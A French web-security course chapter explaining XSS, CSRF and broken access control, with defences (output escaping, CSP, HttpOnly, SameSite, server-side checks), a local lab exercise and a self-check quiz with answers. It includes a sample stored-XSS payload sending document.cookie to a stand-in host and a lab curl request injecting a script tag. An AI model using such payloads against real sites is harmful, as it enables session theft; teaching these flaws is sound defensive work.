[← Chapitre précédent](02-owasp-injections.md) · [Sommaire](Readme.md) · [Chapitre suivant →](04-owasp-config-deps.md)

# Les failles web — quand le navigateur se retourne contre vous

> Un commentaire de client sur une fiche produit : `<script>alert(1)</script>`.
> Le serveur l'affiche tel quel — et soudain, le navigateur de l'administrateur
> qui lit la fiche exécute le code d'un inconnu. Personne n'a piraté le serveur :
> c'est le navigateur qui a obéi.

**Durée de lecture :** 40 min (noyau exigé, atelier compris) · **Aller plus
loin :** +25 min (facultatif, pas exigé pour finir la journée) · **Prérequis :**
le chapitre « Les injections — quand les données deviennent des instructions »

---

## Objectifs

À l'issue de ce chapitre, vous serez capable de :

- **Distinguer** les trois formes de **XSS** (Cross-Site Scripting) : réfléchi,
  stocké, côté **DOM** (Document Object Model).
- **Relier** une attaque **CSRF** (Cross-Site Request Forgery) à la confiance que
  le navigateur accorde aux cookies de session.
- **Identifier** une faille de contrôle d'accès dans un point d'entrée
  d'application.
- **Repérer**, dans un extrait de code, une sortie non échappée ou une vérification
  de rôle manquante.

---

## I. XSS — le texte qui devient du code

Le web affiche du texte et exécute du code dans la même page. Le navigateur fait
la différence grâce à la **syntaxe** : ce qui ressemble à une balise
HTML (HyperText Markup Language) est exécuté, le reste est affiché. Quand une
application insère une saisie dans une page sans la marquer comme du **texte**, la
frontière saute.

### La forme la plus simple : le XSS stocké

Un site d'avis sur des restaurants laisse ses clients déposer un commentaire. Le
texte est enregistré en base, puis affiché sur la fiche du restaurant. Un client
dépose ceci :

```html
<script>document.location="https://malin.example/cookie?c="+document.cookie</script>
```

Le commentaire est **stocké** : chaque visiteur qui ouvre la fiche reçoit le
script dans la page, et son navigateur l'exécute. Si c'est un administrateur qui
modère les avis, le script travaille avec ses droits — vol de session, actions
faites en son nom, déplacement vers l'espace d'administration.

### Les deux autres formes

- **Le XSS réfléchi** : la saisie n'est pas stockée ; elle revient dans la réponse
  immédiate, souvent depuis l'adresse de la page. Un lien piégé suffit — c'est le
  courriel d'hameçonnage qui porte l'attaque, pas la base de données.
- **Le XSS côté DOM** : la page assemble elle-même son contenu, en JavaScript, à
  partir de l'adresse ou du stockage du navigateur. Le serveur n'y voit que du
  feu : la transformation dangereuse a lieu dans le navigateur.

| Forme | Où la saisie attend | Ce qui la déclenche |
| --- | --- | --- |
| Stocké | en base, dans une page consultée souvent | la lecture de la page |
| Réfléchi | dans la réponse immédiate | l'ouverture d'un lien piégé |
| Côté DOM | dans le code JavaScript de la page | l'exécution du script de la page |

> 🧪 **Atelier rapide (8 min)**
>
> Le service `vulnerable` du lab renvoie la saisie dans une page sans
> l'échapper. Après `cd lab` puis `docker compose up --build -d`, observez :
>
> ```bash
> curl "http://localhost:8080/comments?q=<script>alert(1)</script>"
> ```
>
> Repérez dans la réponse la balise de script, intacte, à l'endroit où du texte
> était attendu. Reformulez en une phrase ce que ferait un navigateur en
> affichant cette réponse.

### Ce qui coupe la chaîne — échapper à la sortie

- **L'échappement de sortie** : convertir les caractères spéciaux en entités
  HTML, à chaque insertion — les gabarits modernes le font par défaut, à condition
  de ne pas demander l'inverse.
- **La politique de sécurité du contenu** — **CSP** (Content Security Policy) : une
  liste d'en-têtes qui indique au navigateur quelles sources de script il a le
  droit d'exécuter. Une seconde barrière, précieuse quand l'échappement a été
  oublié quelque part.
- **La protection des cookies** : marquer les cookies de session comme
  `HttpOnly` pour que le script ne puisse pas les lire. Cela ne supprime pas le
  XSS, mais il vole moins facilement une session.

> [!WARNING]
> Échapper à l'entrée ne protège pas à la sortie : la même donnée peut être
> affichée dans une page, dans un courriel, dans un export. C'est à chaque
> sortie que le texte doit être marqué comme tel.

---

## II. CSRF — faire agir l'utilisateur sans qu'il le sache

Votre banque vous connecte, puis ouvre une page qui déclenche un virement dès
qu'elle est chargée — parce qu'un onglet malveillant, ouvert en parallèle, vient
de lancer la requête à votre place. Vous n'avez rien vu : votre navigateur, lui,
a joint votre cookie de session à la requête, comme toujours.

Le mécanisme tient en une phrase : **le navigateur envoie les cookies tout seul**.
Le serveur reçoit une requête authentifiée et n'a aucun moyen de savoir qui l'a
déclenchée — vous, ou la page que vous consultiez.

### Les formes classiques

- une image dont l'adresse est l'action à exécuter — le chargement de l'image
  suffit à lancer la requête ;
- un formulaire invisible qui se soumet tout seul ;
- un lien que la victime clique, croyant aller ailleurs.

### Ce qui coupe la chaîne — prouver l'origine

- **Le jeton anti-CSRF** : une valeur aléatoire, connue du serveur et de la page
  légitime, exigée dans chaque requête qui modifie quelque chose. La page
  malveillante ne peut pas la deviner.
- **L'attribut `SameSite`** du cookie : il indique au navigateur de n'envoyer le
  cookie que pour les requêtes venant du même site. C'est aujourd'hui la barrière
  la plus répandue, et la plus simple à mettre en place.
- **La re-authentification** pour les actions sensibles : redemander le mot de
  passe avant un virement, une suppression, un changement de compte.

> [!TIP]
> Une règle simple à retenir : toute requête qui **modifie** quelque chose doit
> prouver qu'elle vient de votre application, pas seulement que l'utilisateur est
> connecté.

---

## III. Broken Access Control — faire ce qu'on n'a pas le droit de faire

Un portail de ressources humaines affiche les fiches de paie. L'adresse d'une
fiche ressemble à `/fiches/1042`. Un salarié remplace le numéro par celui d'un
collègue — et la fiche s'affiche. Le contrôle d'accès existait peut-être dans
l'interface : le bouton était masqué. Mais l'interface n'est pas la porte, c'est
la vitrine.

C'est la famille **A01** — Broken Access Control, la plus fréquente du Top 10 de
l'**OWASP** (Open Web Application Security Project). Elle recouvre des cas
nombreux :

- une adresse d'administration accessible sans rôle particulier ;
- un identifiant modifiable dans l'adresse ou dans les paramètres ;
- une vérification faite côté navigateur, jamais côté serveur ;
- un compte qui garde ses droits après un changement de fonction.

### Ce qui coupe la chaîne — vérifier côté serveur

- **Vérifier côté serveur, à chaque requête** : le rôle de l'utilisateur est
  examiné par le serveur, pas par l'affichage du menu.
- **Refuser par défaut** : ce qui n'est pas explicitement autorisé est interdit —
  l'inverse du réflexe « c'est interne, personne ne cherchera ».
- **Ne pas exposer d'identifiant prévisible** quand la ressource est sensible, ou
  alors vérifier que la ressource appartient bien à celui qui la demande.
- **Tester les contournements** : appeler les adresses directement, sans passer
  par l'interface, et vérifier que la réponse est bien un refus.

> [!DANGER]
> Masquer un bouton n'est pas interdire une action. Tant que le serveur accepte
> la requête, l'action est ouverte — le navigateur n'est qu'un client parmi
> d'autres.

### Où se rangent ces failles dans la carte OWASP

En une ligne : le XSS se range en **A03** — Injection, car le mécanisme est le
même que pour les injections ; le CSRF se rattache à **A01**, car il détourne
une action que l'utilisateur avait le droit de faire. Classer reste un outil
pour se parler — c'est le mécanisme qui compte.

---

## IV. Aller plus loin

*Contenu facultatif, pas exigé pour finir la journée : ces approfondissements
ne sont jamais exigés pour terminer le cours.*

- **Le rangement OWASP en détail** : la carte n'a pas une case pour tout. Dans
  la version actuelle du Top 10, le XSS se range dans la famille **A03** —
  Injection, parce que le mécanisme est le même que pour les injections : des
  données traitées comme du code. Le CSRF n'a pas de famille propre ; on le
  rattache le plus souvent à **A01**, car il détourne une action que
  l'utilisateur avait le droit de faire.

- **`SameSite` en détail** : les valeurs `Strict`, `Lax` et `None`, ce qu'elles
  changent pour les liens entrants, les intégrations tierces et les flux de
  connexion.
- **Les attaques CSRF modernes** : quand une faille XSS existe, elle rend le
  jeton anti-CSRF inutile — le script lit la page comme la victime. Les deux
  sujets se rejoignent : une application qui échappe bien ses sorties résiste aux
  deux.
- **Le XSS côté DOM en profondeur** : les sources dangereuses du navigateur
  (l'adresse, les fragments, le stockage local) et les fonctions JavaScript qui
  les injectent dans la page.

---

## Points clés

- Le XSS naît d'une confusion entre **ce que l'utilisateur voit** et **ce que le
  navigateur exécute** ; l'échappement de sortie rétablit la frontière.
- Trois formes, un même mécanisme : stocké, réfléchi, côté DOM — ce qui change,
  c'est l'endroit où la saisie attend.
- Le CSRF exploite la confiance automatique du navigateur dans les cookies ; le
  jeton anti-CSRF et l'attribut `SameSite` obligent la requête à prouver son
  origine.
- Le contrôle d'accès se vérifie **côté serveur, à chaque requête** — masquer un
  bouton n'interdit rien.
- La carte OWASP aide à nommer les failles ; c'est le mécanisme, cause racine
  comprise, qui guide le correctif.

---

## 🧠 Vérifiez vos acquis

*Formatif, jamais noté. Répondez sans relire le chapitre, puis dépliez « Vérifier ses réponses » pour vous corriger : ce qui compte est de repérer où vous vacillez, pas de faire 5 sur 5.*

**1.** Un courriel hameçonné propose un lien dont l'adresse contient une balise de script ; la page d'erreur renvoie ce morceau de l'adresse tel quel dans la réponse, sans rien enregistrer en base. Quelle forme de **XSS** (Cross-Site Scripting) est-ce ?

- A. Le XSS stocké : la charge est enregistrée côté serveur, puis servie à chaque visiteur de la page
- B. Le XSS réfléchi : la saisie revient dans la réponse immédiate, c'est l'ouverture du lien piégé qui déclenche
- C. Le XSS côté DOM : un script de la page lit l'adresse et injecte la saisie dans le document
- D. Ce n'est pas un XSS : le serveur n'a exécuté aucune instruction, il a seulement affiché du texte

**2.** On marque les cookies de session `HttpOnly`. Que change cette mesure ?

- A. Le XSS devient impossible : sans cookie lisible, la balise de script n'est plus exécutée du tout
- B. Le navigateur n'envoie plus le cookie aux requêtes venues d'un autre site, ce qui ferme la porte au CSRF
- C. Le script ne peut plus lire le cookie : le XSS vole moins facilement une session, mais n'est pas supprimé
- D. Le navigateur refuse les scripts venant de sources étrangères, ce qui filtre la balise injectée

**3.** Une page malveillante ouverte dans un onglet déclenche un virement sur votre banque. Le serveur reçoit la requête et ne peut pas dire qui l'a lancée. Pourquoi ?

- A. Parce que l'attaquant a récupéré le mot de passe de la victime au préalable, par hameçonnage
- B. Parce que le navigateur envoie les cookies tout seul : la requête arrive authentifiée, sans signe de qui l'a déclenchée
- C. Parce que le jeton anti-CSRF était prévisible : l'attaquant l'a recalculé et joint à sa requête
- D. Parce que la banque n'utilisait pas la politique de sécurité du contenu, qui aurait bloqué l'onglet tiers

**4.** Dans un portail de ressources humaines, le bouton « Fiches de paie » est masqué pour les salariés. L'adresse `/fiches/1043` répond quand même à un salarié qui tape le numéro d'un collègue. Quel est le problème ?

- A. Un identifiant prévisible : il suffit de numéroter les fiches au hasard
- B. Une vérification faite côté navigateur et jamais côté serveur : l'interface est la vitrine, pas la porte
- C. Une défaillance de configuration : il faut retirer la page de documentation technique
- D. Un **CSRF** (Cross-Site Request Forgery) : la requête ne prouvait pas son origine

**5.** *Question ouverte (2-3 lignes).* « Échapper à l'entrée ne protège pas à la sortie. » Expliquez cette phrase avec un exemple du chapitre, et nommez la mesure qui applique ce principe.

---

<details>
<summary>Vérifier ses réponses</summary>

### Réponses

**1. B.** Rien n'est stocké : la saisie attend dans l'adresse et revient dans la réponse immédiate. C'est le lien piégé qui porte l'attaque, pas la base de données.
**Pourquoi :** ce qui distingue les trois formes, c'est l'endroit où la saisie attend — en base (stocké), dans la réponse immédiate (réfléchi), dans le JavaScript de la page (côté DOM).

**2. C.** `HttpOnly` retire au script la lecture du cookie : la session est moins facilement volée.
**Pourquoi :** le chapitre est explicite — cela ne supprime pas le XSS. Les réponses B et D décrivent deux autres barrières, l'attribut `SameSite` et la **CSP** (Content Security Policy).

**3. B.** C'est tout le mécanisme du CSRF : le navigateur joint le cookie de session comme toujours, et le serveur reçoit une requête authentifiée.
**Pourquoi :** le serveur ne peut pas deviner l'origine de la requête — d'où la règle du chapitre : toute requête qui **modifie** quelque chose doit prouver qu'elle vient de l'application, par un jeton anti-CSRF, l'attribut `SameSite`, ou une re-authentification pour les actions sensibles.

**4. B.** Le contrôle d'accès n'existait que dans l'affichage du menu ; le serveur, lui, acceptait la requête.
**Pourquoi :** masquer un bouton n'est pas interdire une action — le navigateur n'est qu'un client parmi d'autres. La correction est de vérifier le rôle côté serveur, à chaque requête, et de refuser par défaut ; l'identifiant prévisible n'est qu'une porte d'entrée de plus.

**5.** Attendu : une donnée validée ou nettoyée une fois à l'entrée peut être réaffichée n'importe où — dans une page, dans un courriel, dans un export — et chaque support a sa propre syntaxe à respecter. Mesure attendue : l'échappement de sortie, appliqué à chaque insertion.
**Pourquoi :** c'est au moment de l'affichage que le navigateur doit savoir que ce texte est du texte et non du code ; les gabarits modernes le font par défaut, à condition de ne pas demander l'inverse.

</details>

---

[← Chapitre précédent](02-owasp-injections.md) · [Sommaire](Readme.md) · [Chapitre suivant →](04-owasp-config-deps.md)
